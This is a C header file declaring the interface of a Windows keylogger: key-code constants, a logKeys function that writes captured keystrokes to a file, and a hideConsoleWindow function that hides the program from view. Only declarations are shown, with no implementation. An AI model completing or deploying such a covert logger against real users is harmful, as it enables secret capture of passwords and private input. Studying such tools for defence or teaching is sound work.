#pragma once
#include <stdio.h>
#include <Windows.h>

/**
* @file keyLogger.h
*/

/**
 * The code for the key 0
 */
#define VK_0 0x30

/**
 * The code for the key 9
 */
#define VK_9 0x39

/**
 * The code for the key 'A'
 */
#define VK_A 0x41

/**
 * The code for the key 'Z'
 */
#define VK_Z 0x5A

/**
 * The minimum time difference between two clicks.
 */
#define INTERVAL 130

/**
 * The maximum length for a string that represents a button, for example "[CAPS LOCK]".
 */
#define MAX_KEY_CONTEXT_LEN 15

/**
 * A type that represents a key
 */
typedef unsigned short key_t;

/**
 * Tracks the user clicks, writes maximumKeys keys into the file outFileName.
 *
 * @param outFileName The name of the file to which the characters will be written.
 * @param maximumKeys The maximum number of characters to write to the file.
 * @return The error code of opening a file.
 */
errno_t logKeys(const char *outFileName, const size_t maximumKeys);

/**
 * Hides the black console window.
 */
void hideConsoleWindow(void);
